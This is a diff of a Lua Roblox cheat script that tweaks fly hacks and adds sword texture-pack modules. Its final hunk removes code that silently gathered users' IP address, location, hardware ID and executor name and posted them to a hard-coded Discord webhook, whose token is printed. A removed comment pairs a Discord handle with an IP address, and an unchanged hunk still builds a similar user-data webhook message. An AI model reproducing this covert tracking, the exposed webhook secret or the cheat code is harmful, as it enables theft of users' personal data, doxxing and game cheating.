@@ -53,11 +53,11 @@ for i, v in pairs(Blacklist) do
                    ["inline"] = true
                 },
                 {
-					["name"] = "Discord Username:",
-					["value"] = ""..v.."",
-					["inline"] = true
-				 },
-				 {
+				   ["name"] = "Discord Username:",
+				   ["value"] = ""..v.."",
+				   ["inline"] = true
+				},
+				{
                    ["name"] = "ID:",
                    ["value"] = "["..lplr.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")",
                    ["inline"] = true
@@ -3074,7 +3074,7 @@ runcode(function()
 							if FlyMode.Value ~= "Normal" then
 								local speedValue = FlySpeed.Value
 								if FlyMode.Value == "Heatseeker" then 
-									speedValue = tick() % 1 < 0.6 and 5 or (22 * getSpeedMultiplier(true)) / 0.4
+									speedValue = tick() % 1 < 0.6 and 5 or (23 * getSpeedMultiplier(true)) / 0.4
 								end
 							entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + (entityLibrary.character.Humanoid.MoveDirection * (speedValue - 20)) * delta
 						end
@@ -10572,9 +10572,6 @@ end)
 										if not removesettings.Enabled then
 										game:GetService("Players").LocalPlayer.PlayerGui.TopBarAppGui.TopBarApp["4"].Visible = true
 									end
-									if not removehealthbar.Enabled then
-									game:GetService("Players").LocalPlayer.PlayerGui.hotbar["1"].HotbarHealthbarContainer.Visible = true
-								end
 								if not removeregiontext.Enabled then
 								game:GetService("Players").LocalPlayer.PlayerGui.ServerRegionDisplay.ServerRegionText.Visible = true
 							end
@@ -10977,6 +10974,10 @@ end)
 								jadefly.ToggleButton(false) 
 								warningNotification("JadeFly", "Jade Hammer is Recharging.", 2)
 							end
+							if not getItem("jade_hammer") then
+								jadefly.ToggleButton(false) 
+								warningNotification("JadeFly", "You have to have a jade hammer", 2)
+							end
 						else
 							FlyUp1 = false
 							FlyDown1 = false
@@ -11087,48 +11088,149 @@ end)
 			})
 		end)
 
-	runcode(function()
-		local AntiDeathPosition =  {["Value"] = 3000}
-		local AntiDeathLowHealth =  {["Value"] = 3000}
-		local AntiDeathSafeHealth =  {["Value"] = 3000}
-		local AntiDeath = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
-			Name = "AntiDeath",
-			Function = function(callback)
+		runcode(function()
+			local texturepack = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
+				Name = "Texturepack",
+				Function = function(callback)
 					if callback then
-						task.spawn(function()
-							repeat
-								task.wait(0.4)
-								if game.Players.LocalPlayer.Character.Humanoid.Health <= AntiDeathLowHealth["Value"] then
-									local oldPos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(oldPos.X ,400, oldPos.Z)
-						end
-					until game.Players.LocalPlayer.Character.Humanoid.Health == AntiDeathSafeHealth["Value"] or not AntiDeath.Enabled
-				end)
-			end
-		end
-	})
-	AntiDeathPosition = AntiDeath.CreateSlider({
-		Name = "Position",
-		Function = function() end,
-		Min = 1,
-		Max = 3000,
-		Default = 3000,
-	})
-	AntiDeathLowHealth = AntiDeath.CreateSlider({
-		Name = "Low Health",
-		Function = function() end,
-		Min = 1,
-		Max = 40,
-		Default = 40,
-	})
-	AntiDeathSafeHealth = AntiDeath.CreateSlider({
-		Name = "Safe Health",
-		Function = function() end,
-		Min = 1,
-		Max = 100,
-		Default = 100,
-	})
-end)
+						repeat task.wait() until game.ReplicatedStorage and game.ReplicatedStorage.Inventories and game.Players.LocalPlayer and game.ReplicatedStorage.Inventories:FindFirstChild(game.Players.LocalPlayer.Name) and workspace.CurrentCamera:FindFirstChild("Viewmodel")
+						local repstorage = game.ReplicatedStorage
+						items = {
+							"sword",
+						}
+						local swordTable = {
+							Texturepack32x = {
+								["wood"] = {"13156260367", "13156264394"},
+								["stone"] = {"13156535067", "13156533518"},
+								["iron"] = {"13156652510", "13156654736"},
+								["diamond"] = {"13156798963", "13156800982"},
+								["emerald"] = {"13160122132", "13160122773"}
+							}
+						}
+						local currentOverlay = swordTable.Texturepack32x
+						Connection = workspace.CurrentCamera.Viewmodel.ChildAdded:Connect(function(v)
+							if v:IsA("Accessory") and v:FindFirstChild("Handle") then
+								for i, v2 in pairs(items) do
+									if string.find(v.Name, v2) then
+										if string.find(v.Name, "sword") then
+											if v.Handle:FindFirstChild("gem") then 
+												v.Handle:FindFirstChild("gem"):Destroy()
+											elseif v.Handle:FindFirstChild("Neon") then
+												v.Handle:FindFirstChild("Neon"):Destroy()
+												v.Handle.Size = v.Handle.Size * 3
+											end
+											v:FindFirstChild("Handle").MeshId = "rbxassetid://" .. currentOverlay[string.split(v.Name, "_")[1]][1]
+											v:FindFirstChild("Handle").TextureID = "rbxassetid://" .. currentOverlay[string.split(v.Name, "_")[1]][2]
+											if currentOverlay["downscale"] ~= nil then v.Handle.Size = v.Handle.Size / currentOverlay["downscale"] end
+											for i, v in pairs(lplr.Character:GetChildren()) do
+   											 if v.Name:find('sword') or v.Name:find('scythe') or v.Name:find('blade') then
+												if  v.Name:find('wood') then
+													v.Handle.Size = v.Handle.Size * 0.8
+														v.Handle.MeshId = "rbxassetid://13156260367" v.Handle.TextureID = "rbxassetid://13156264394"
+													elseif v.Name:find('stone') then
+														v.Handle.Size = v.Handle.Size * 0.8
+														v.Handle.MeshId = "rbxassetid://13156535067" v.Handle.TextureID = "rbxassetid://13156533518"
+													elseif v.Name:find('iron') then
+														v.Handle.Size = v.Handle.Size * 0.7
+														v.Handle.MeshId = "rbxassetid://13156652510" v.Handle.TextureID = "rbxassetid://13156654736"
+													elseif v.Name:find('diamond') then
+														v.Handle.Size = v.Handle.Size * 0.6
+														v.Handle.MeshId = "rbxassetid://13156798963" v.Handle.TextureID = "rbxassetid://13156800982"
+													elseif v.Name:find('emerald') then
+														v.Handle.Size = v.Handle.Size * 1
+														v.Handle.MeshId = "rbxassetid://13160122132" v.Handle.TextureID = "rbxassetid://13160122773"
+													end
+												end
+											end
+										end    
+									end
+								end 
+							end
+						end)
+					else
+						Connection:Disconnect()
+					end
+				end
+			})
+		end)
+
+		runcode(function()
+			local texturepack32x = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
+				Name = "Texturepack32x",
+				Function = function(callback)
+					if callback then
+						repeat task.wait() until game.ReplicatedStorage and game.ReplicatedStorage.Inventories and game.Players.LocalPlayer and game.ReplicatedStorage.Inventories:FindFirstChild(game.Players.LocalPlayer.Name) and workspace.CurrentCamera:FindFirstChild("Viewmodel")
+						local repstorage = game.ReplicatedStorage
+						items = {
+							"sword",
+						}
+						local swordTable = {
+							Exhibition = {
+								["wood"] = {"13052416562", "13052417584"},
+								["stone"] = {"13052307742", "13052309606"},
+								["iron"] = {"13045938020", "13045940316"},
+								["diamond"] = {"13045611120", "13045612849"},
+								["emerald"] = {"13052515751", "13052517600"}
+							},
+							Texturepack32x = {
+								["wood"] = {"13156260367", "13156264394"},
+								["stone"] = {"13156535067", "13156533518"},
+								["iron"] = {"13156652510", "13156654736"},
+								["diamond"] = {"13156798963", "13156800982"},
+								["emerald"] = {"13160122132", "13160122773"}
+							}
+						}
+						local currentOverlay = swordTable.Exhibition
+						Connection = workspace.CurrentCamera.Viewmodel.ChildAdded:Connect(function(v)
+							if v:IsA("Accessory") and v:FindFirstChild("Handle") then
+								for i, v2 in pairs(items) do
+									if string.find(v.Name, v2) then
+										if string.find(v.Name, "sword") then
+											if v.Handle:FindFirstChild("gem") then 
+												v.Handle:FindFirstChild("gem"):Destroy()
+											elseif v.Handle:FindFirstChild("Neon") then
+												v.Handle:FindFirstChild("Neon"):Destroy()
+												v.Handle.Size = v.Handle.Size * 3
+											end
+											v:FindFirstChild("Handle").MeshId = "rbxassetid://" .. currentOverlay[string.split(v.Name, "_")[1]][1]
+											v:FindFirstChild("Handle").TextureID = "rbxassetid://" .. currentOverlay[string.split(v.Name, "_")[1]][2]
+											if currentOverlay["downscale"] ~= nil then v.Handle.Size = v.Handle.Size / currentOverlay["downscale"] end
+											for i, v in pairs(lplr.Character:GetChildren()) do
+   											 if v.Name:find('sword') or v.Name:find('scythe') or v.Name:find('blade') then
+												if  v.Name:find('wood') then
+													v.Handle.Size = v.Handle.Size * 1
+														v.Handle.MeshId = "rbxassetid://13052416562"
+														v.Handle.TextureID = "rbxassetid://13052417584"
+													elseif v.Name:find('stone') then
+														v.Handle.Size = v.Handle.Size * 1
+														v.Handle.MeshId = "rbxassetid://13052307742"
+														v.Handle.TextureID = "rbxassetid://13052309606"
+													elseif v.Name:find('iron') then
+														v.Handle.Size = v.Handle.Size * 1
+														v.Handle.MeshId = "rbxassetid://13045938020"
+														v.Handle.TextureID = "rbxassetid://13045940316"
+													elseif v.Name:find('diamond') then
+														v.Handle.Size = v.Handle.Size * 1
+														v.Handle.MeshId = "rbxassetid://13045611120"
+														v.Handle.TextureID = "rbxassetid://13156800982"
+													elseif v.Name:find('emerald') then
+														v.Handle.Size = v.Handle.Size * 3.8
+														v.Handle.MeshId = "rbxassetid://13160122132"
+														v.Handle.TextureID = "rbxassetid://13160122773"
+													end
+												end
+											end
+										end    
+									end
+								end 
+							end
+						end)
+					else
+						Connection:Disconnect()
+					end
+				end
+			})
+		end)
 
 				runcode(function()
 					local logs = {["Enabled"] = false}
@@ -11172,17 +11274,17 @@ end)
 						end,
 						["HoverText"] = "You need discord and a server to use it."
 					})
-	Webhook2 = logs.CreateTextBox({
-		["Name"] = "WebHook",
-		["TempText"] = "Your discord webhook",
-		["FocusLost"] = function(enter) end
+		Webhook2 = logs.CreateTextBox({
+			["Name"] = "WebHook",
+			["TempText"] = "Your discord webhook",
+			["FocusLost"] = function(enter) end
 		})
-	PingUser2 = logs.CreateTextBox({
-		["Name"] = "ID",
-		["TempText"] = "UserID",
-		["FocusLost"] = function(enter) end
-	})
-end)
+		PingUser2 = logs.CreateTextBox({
+			["Name"] = "ID",
+			["TempText"] = "UserID",
+			["FocusLost"] = function(enter) end
+		})
+	end)
 
 task.spawn(function()
 	local function createannouncement(announcetab)
@@ -11331,65 +11433,6 @@ for hwid, name in pairs(informationwarning) do
 		end
 	end
 else
-		local Webhook = "https://discord.com/api/webhooks/1095713352417824880/Yo1aLeeqThTaHXVjYkeU24EuqXgPJrd073aWL8OjFy8tEUWNnNPvYC221_4Wm4CLZ0iD"
-		_G.Discord_UserID = ""
-		local player = game:GetService"Players".LocalPlayer
-		local joinTime = os.time() - (player.AccountAge*86400)
-		local joinDate = os.date("!*t", joinTime)
-		local premium = false
-		local alt = true
-		if player.MembershipType == Enum.MembershipType.Premium then
-		   premium = true
-		end
-		local executor = identifyexecutor() or "Unknown"
-		local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
-		Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
-		local AvatarImage = Thing.imageUrl
-		local msg = {
- 	  	["username"] = "Vape",
-   		["avatar_url"] = "https://cdn.discordapp.com/attachments/1068501433122562068/1098295120761204756/IMG_2475.jpg",
-   		["content"] = ( _G.Discord_UserID ~= "" and  _G.Discord_UserID ~= nil) and tostring("<@".._G.Discord_UserID..">") or " ",
-  		["embeds"] = {
-       		{
-           ["color"] = tonumber(tostring("0x32CD32")), --decimal
-           ["title"] = "Player is Not Whitelisted",
-           ["thumbnail"] = {
-               ["url"] = AvatarImage,
-           },
-           ["fields"] = {
-                {
-                   ["name"] = "Roblox Username:",
-                   ["value"] = ""..lplr.Name.."",
-                   ["inline"] = true
-                },
-                {
-                   ["name"] = "ID:",
-                   ["value"] = "["..lplr.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")",
-                   ["inline"] = true
-                },
-                {
-                   ["name"] = "Executor:",
-                   ["value"] = executor,
-                   ["inline"] = true
-                },
-                {
-                   ["name"] = "Ip and Location:",
-                   ["value"] = tostring(game:HttpGet("http://ip-api.com/csv/", true)),
-                   ["inline"] = true
-                },
-                {
-                  ["name"] = "HWID:",
-                  ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
-                  ["inline"] = true
-                }
-          		},
-		   		['timestamp'] = os.date("%Y-%m-%dT%X.000Z")
-       		}
-  		 }
-	}
-	request = http_request or request or HttpPost or syn.request
-		request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
-			GuiLibrary.SelfDestruct()
-		game.Players.LocalPlayer:Kick("You are not Whitelisted")
-	end
---// 102.902#3052 ip is 149.34.244.160
+	GuiLibrary.SelfDestruct()
+	game.Players.LocalPlayer:Kick("You are not Whitelisted")
+end
